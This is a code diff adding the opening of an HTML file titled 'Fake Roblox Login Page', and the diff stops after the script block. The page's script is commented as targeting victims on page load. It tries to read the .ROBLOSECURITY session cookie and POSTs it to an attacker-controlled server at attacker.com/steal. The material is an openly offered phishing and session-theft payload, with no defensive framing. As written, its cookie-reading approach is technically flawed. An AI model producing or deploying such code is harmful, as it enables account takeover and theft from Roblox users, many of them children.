@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fake Roblox Login Page</title>
+    <script>
+        // This script will run as soon as the victim visits the phishing page
+
+        // Step 1: Try to access the ROBLOSECURITY cookie for roblox.com
+        const robloxSecurityCookie = document.cookie.match(/(.ROBLOSECURITY=[^;]+)/);
+
+        if (robloxSecurityCookie) {
+            // Step 2: Send the stolen cookie to the attacker's server
+
+            fetch('https://attacker.com/steal', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    roblox_cookie: robloxSecurityCookie[0] // Send the stolen cookie value
+                })
+            })
+            .then(response => response.json())
+            .catch(error => console.error('Error sending cookie:', error));
+        }
+    </script>
+
